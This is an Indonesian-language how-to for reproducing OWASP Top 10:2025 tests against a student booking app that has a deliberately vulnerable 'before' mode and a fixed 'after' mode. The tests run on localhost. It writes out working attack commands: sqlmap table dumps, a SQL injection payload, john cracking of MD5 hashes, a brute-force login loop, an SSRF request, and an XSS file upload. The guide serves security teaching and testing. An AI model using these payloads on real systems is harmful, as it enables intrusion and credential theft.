# Panduan Pengujian OWASP Top 10:2025 — Venu (Windows & Kali Linux)

> **Ditujukan untuk:** anggota kelompok yang akan **mereproduksi** pengujian dan mengumpulkan bukti (screenshot/log) untuk laporan. Dokumen ini adalah *how-to* langkah demi langkah. Ringkasan hasil & tabel temuan ada di [`before/README.md`](before/README.md) dan [`after/README.md`](after/README.md); proses amannya di [`sad-process.md`](sad-process.md).

---

## 0. Konsep penting sebelum mulai

- Satu basis kode, dua kondisi, dipilih lewat **`SECURITY_MODE`**: `before` (celah aktif) dan `after` (aman). Web: `VITE_SECURITY_MODE`.
- **Mode `before` sengaja hanya mendengar di `127.0.0.1`** dan menolak jalan bila `NODE_ENV=production`. Ini pengaman agar versi rentan tak pernah ter-deploy. Konsekuensinya untuk pengujian: alat penyerang harus bisa menjangkau `127.0.0.1` server — lihat §2 (opsi jaringan Kali).
- **A03 (Supply Chain)** tidak ikut saklar `SECURITY_MODE`; ia dibedakan lewat **tag Git**: uji di `v1-before` (paket rentan) vs `v2-after` (sudah dihapus).
- Gunakan **hanya data dummy**. Jangan uji di internet publik.

---

## 1. Persiapan server (pilih salah satu host)

### 1A. Menjalankan di Windows (host utama proyek)
```powershell
# folder: backend
cd backend
copy .env.example .env            # lalu isi DATABASE_URL (Neon) & JWT_SECRET (>=32 char)
npm install
npm run db:migrate
npm run db:seed
# jalankan MODE BEFORE (PowerShell):
$env:SECURITY_MODE="before"; npm run dev
# -> "Venu API berjalan di http://127.0.0.1:4000 — mode BEFORE"
```
Ganti ke mode after: tutup server, lalu `$env:SECURITY_MODE="after"; npm run dev`.

### 1B. Menjalankan di Kali Linux / WSL (disarankan bila alat uji ada di Kali)
Karena mode before listen di `127.0.0.1`, cara paling mudah adalah menjalankan aplikasinya **di dalam Kali** sehingga alat Kali menembak `localhost`.
```bash
# di Kali
sudo apt update && sudo apt install -y nodejs npm git   # butuh Node 20+; untuk Node 24 pakai nvm
git clone <repo-venu> && cd venu/backend
cp .env.example .env            # isi DATABASE_URL & JWT_SECRET
npm install
npm run db:migrate && npm run db:seed
SECURITY_MODE=before npm run dev   # http://127.0.0.1:4000
```
> Node 24 (type stripping) disarankan. Pasang via nvm: `curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash && nvm install 24`.

## 2. Opsi jaringan: Kali (VM) menyerang server di Windows

Bila server tetap di Windows tetapi alat ada di Kali VM:

| Mode | Cara menjangkau dari Kali |
|---|---|
| `after` | Jalankan server dengan `HOST=0.0.0.0` → `$env:HOST="0.0.0.0"; $env:SECURITY_MODE="after"; npm run dev`. Dari Kali akses `http://<IP-Windows>:4000`. |
| `before` | Server **tetap** di `127.0.0.1`. Buat relay di Windows (adapter host-only, mis. `192.168.56.1`): `netsh interface portproxy add v4tov4 listenaddress=192.168.56.1 listenport=4000 connectaddress=127.0.0.1 connectport=4000` lalu buka firewall port 4000. Dari Kali akses `http://192.168.56.1:4000`. Hapus relay setelah selesai: `netsh interface portproxy delete v4tov4 listenaddress=192.168.56.1 listenport=4000`. |

Set variabel target di Kali agar perintah di bawah ringkas:
```bash
export TARGET=http://127.0.0.1:4000     # atau http://192.168.56.1:4000
```
Pada Windows (PowerShell): `$TARGET="http://127.0.0.1:4000"`.

## 3. Alat per sistem

| Kategori | Windows | Kali Linux |
|---|---|---|
| Umum / proxy | curl, Burp Suite Community, OWASP ZAP | curl, Burp, ZAP, ffuf |
| A03 dependensi | `npm audit` | `npm audit`, `retire.js`, OWASP Dependency-Check |
| A04 transport/hash | Wireshark | Wireshark/`tcpdump`, `hashid`, `john`/`hashcat`, `testssl.sh` |
| A05 SQLi/XSS | ZAP, curl | **`sqlmap`**, XSStrike |
| A02 misconfig | curl `-I`, ZAP | `nikto`, `curl -I`, `testssl.sh` |
| A07 auth | Burp Intruder | `jwt_tool`, skrip brute force, Burp Intruder |

> Siapkan akun uji sendiri lewat registrasi (jangan pakai akun asli). Contoh perintah di bawah memakai dua penyewa + satu pemilik yang kamu buat sendiri; ganti `:id` sesuai respons.

---

## 4. Pengujian per kategori (A01–A10)

Untuk tiap kategori: **tujuan → langkah → hasil Before vs After → bukti yang disimpan.** Simpan screenshot/log ke `docs/before/` atau `docs/after/`.

### A01 — Broken Access Control (IDOR, role, SSRF)
**Langkah (curl/Burp):**
```bash
# siapkan dua akun penyewa (A dan B) + catat token masing-masing
curl -s $TARGET/auth/register -H 'Content-Type: application/json' -d '{"nama":"A","email":"a@uji.test","password":"Rahasia123","role":"penyewa"}'
# ... login A & B, simpan token. A buat booking, lalu:
# IDOR: B membaca booking milik A
curl -i $TARGET/bookings/<ID_BOOKING_A> -H "Authorization: Bearer <TOKEN_B>"
# Privilege escalation: daftar sebagai admin
curl -i $TARGET/auth/register -H 'Content-Type: application/json' -d '{"nama":"x","email":"admin2@uji.test","password":"Rahasia123","role":"admin"}'
# SSRF: jalankan canary dulu, lalu paksa server menembaknya
python3 -m http.server 9099     # (terminal lain / di Kali)
curl -i $TARGET/venues/<ID_VENUE>/photo-url -H "Authorization: Bearer <TOKEN_OWNER>" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:9099/ssrf"}'
```
**Before:** booking orang lain `200`; akun `admin` dibuat; canary menerima `GET /ssrf`. **After:** `404`/`400`; canary diam.
**Bukti:** screenshot Burp Repeater / output curl + log canary.

### A02 — Security Misconfiguration
```bash
curl -I $TARGET/ping                      # cek header
curl -s $TARGET/tidak-ada                 # picu error -> cek field "stack"
nikto -host $TARGET                        # (Kali) pindai misconfig
```
**Before:** `X-Powered-By: Express`, `Access-Control-Allow-Origin: *`, tanpa CSP/HSTS, body error memuat `stack`+path. **After:** header `helmet` (CSP/HSTS/nosniff/X-Frame), tanpa `X-Powered-By`, error generik.
**Bukti:** output `curl -I`, laporan nikto/ZAP.

### A03 — Software Supply Chain Failures
```bash
# di v1-before:
git checkout v1-before && cd backend && npm install
npm audit                                  # 2 kerentanan critical (lodash, minimist)
npm audit --json > ../docs/before/npm-audit.json
# di v2-after:
git checkout v2-after && cd backend && npm install
npm audit                                  # 0 critical
npm audit --json > ../docs/after/npm-audit.json
# alternatif Kali: retire.js / dependency-check
npx retire --path .
```
**Bukti:** keluaran `npm audit` kedua tag.

### A04 — Cryptographic Failures (hash & transport)
```bash
# Transport: rekam login di loopback (Wireshark/tcpdump), cari POST /auth/login
sudo tcpdump -i lo -A 'tcp port 4000 and tcp[((tcp[12]&0xf0)>>2):4]=0x504f5354'
# Hash: ambil password_hash dari DB (psql) lalu identifikasi & crack (Kali)
hashid '33b2e7f44f3c403ba522549936ddf2f9'        # -> MD5
echo '33b2e7f44f3c403ba522549936ddf2f9' > h.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt h.txt
```
**Before:** kredensial **plaintext** di paket HTTP; hash **MD5** cepat dipecahkan. **After:** hash **bcrypt** `$2b$12$…` (hashid: bcrypt, tak bisa di-crack cepat); produksi pakai HTTPS (uji `testssl.sh <host>:443`).
**Bukti:** screenshot paket Wireshark, output hashid/john.

### A05 — Injection (SQLi + XSS)
```bash
# SQLi otomatis (Kali) — parameter q pada pencarian lapangan:
sqlmap -u "$TARGET/venues?q=test" -p q --batch --dbms=postgresql
sqlmap -u "$TARGET/venues?q=test" -p q --batch --dbms=postgresql --dump -T users   # bocorkan email+hash
# Bukti cepat tanpa sqlmap:
curl -s "$TARGET/venues?q=%27%20OR%20%271%27%3D%271%27%20--%20" | head -c 200   # semua baris bocor
curl -i "$TARGET/venues?q=%27"                                                   # error SQL bocor (before)
# XSS tersimpan: kirim ulasan berisi <script> lalu buka halaman detail lapangan di browser
```
**Before:** `sqlmap` menandai `q` **injectable** dan bisa men-dump tabel `users`; `q='` → error SQL; komentar `<script>` dieksekusi di web. **After:** `sqlmap` → *not injectable*; `q='` → `200` tanpa error; komentar tampil sebagai teks.
**Bukti:** output sqlmap, screenshot XSS (before) / teks aman (after).

### A06 — Insecure Design (harga & double booking)
```bash
# Harga dari klien:
curl -i $TARGET/bookings -H "Authorization: Bearer <TOKEN_A>" -H 'Content-Type: application/json' \
  -d '{"venue_id":<V>,"tanggal":"<besok>","jam_mulai":"08:00","jam_selesai":"09:00","total_harga":1}'
# lalu GET booking -> cek total_harga
# Double booking: dua request slot sama (A lalu B)
```
**Before:** `total_harga` tersimpan `1`; dua booking slot sama keduanya `201`. **After:** total dihitung server (harga asli); booking kedua `409`.
**Bukti:** output curl kedua request.

### A07 — Authentication Failures
```bash
# Enumerasi:
curl -i $TARGET/auth/login -H 'Content-Type: application/json' -d '{"email":"tidakada@uji.test","password":"x"}'
curl -i $TARGET/auth/login -H 'Content-Type: application/json' -d '{"email":"a@uji.test","password":"salah"}'
# Password lemah diterima:
curl -i $TARGET/auth/register -H 'Content-Type: application/json' -d '{"nama":"w","email":"w@uji.test","password":"123","role":"penyewa"}'
# Token tanpa exp (Kali):
jwt_tool <TOKEN>          # lihat tidak ada klaim "exp"
# Tanpa rate limit (brute force) — login JSON, pakai skrip:
for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code}\n" $TARGET/auth/login -H 'Content-Type: application/json' -d '{"email":"a@uji.test","password":"coba'$i'"}'; done
```
**Before:** pesan beda (`404` vs `401`) = enumeration; password `123` diterima; token tanpa `exp`; 20× login tetap `401` (tanpa `429`). **After:** `401` seragam; `400` untuk password lemah; token ber-`exp`+`jti`; muncul `429` setelah batas.
**Bukti:** output curl, screenshot jwt_tool.

### A08 — Software/Data Integrity Failures (upload)
```bash
printf '<html><script>alert(1)</script></html>' > evil.html
curl -i $TARGET/venues/<V>/photo -H "Authorization: Bearer <TOKEN_OWNER>" -F "foto=@evil.html;type=image/png"
# jika before: akses foto_url yang dikembalikan -> tampil HTML/script
```
**Before:** `200`, berkas tersimpan nama asli `evil.html`, tersaji berisi `<script>`. **After:** `400` (cek magic bytes).
**Bukti:** output curl + screenshot berkas tersaji.

### A09 — Security Logging & Alerting Failures
```bash
# hitung audit_logs sebelum & sesudah login gagal (psql):
psql "$DATABASE_URL" -c "SELECT count(*) FROM audit_logs;"
curl -s $TARGET/auth/login -H 'Content-Type: application/json' -d '{"email":"a@uji.test","password":"salah"}' >/dev/null
psql "$DATABASE_URL" -c "SELECT count(*) FROM audit_logs;"
```
**Before:** jumlah **tidak berubah** (tak tercatat). **After:** bertambah (login gagal tercatat; alert bila 5 gagal/15 menit/IP).
**Bukti:** dua hasil `count`.

### A10 — Mishandling of Exceptional Conditions (fail-open)
```bash
# buat booking (A) TANPA bayar, lalu owner konfirmasi:
curl -i $TARGET/owner/bookings/<ID_BOOKING_TANPA_BAYAR>/confirm -H "Authorization: Bearer <TOKEN_OWNER>" -X POST
```
**Before:** `200`, status jadi `dikonfirmasi` walau tanpa bukti bayar (fail-open). **After:** `409` (fail-secure, transaksi di-rollback).
**Bukti:** output curl + status booking.

---

## 5. Checklist bukti (per kategori, Before & After)

- [ ] A01 — IDOR + role admin + SSRF (curl/Burp + log canary)
- [ ] A02 — `curl -I` + nikto/ZAP + body error
- [ ] A03 — `npm audit` di `v1-before` & `v2-after`
- [ ] A04 — Wireshark + hashid/john
- [ ] A05 — sqlmap + XSS screenshot
- [ ] A06 — curl harga & double booking
- [ ] A07 — enumerasi + pw lemah + jwt_tool + brute force
- [ ] A08 — upload evil.html
- [ ] A09 — hitung audit_logs
- [ ] A10 — konfirmasi tanpa bayar

Simpan semua ke `docs/before/` dan `docs/after/`, beri nama jelas (mis. `a05-sqlmap-before.png`). Pengujian otomatis berbasis `curl` sudah terekam di `docs/before/raw/transcript.txt` & `docs/after/raw/transcript.txt` sebagai acuan nilai yang diharapkan.

## 6. Setelah pengujian
- Hentikan server & canary; hapus akun/booking uji; hapus relay `netsh portproxy` bila dipakai.
- Jangan commit `.env`, hasil tangkapan yang memuat data asli, atau kredensial.
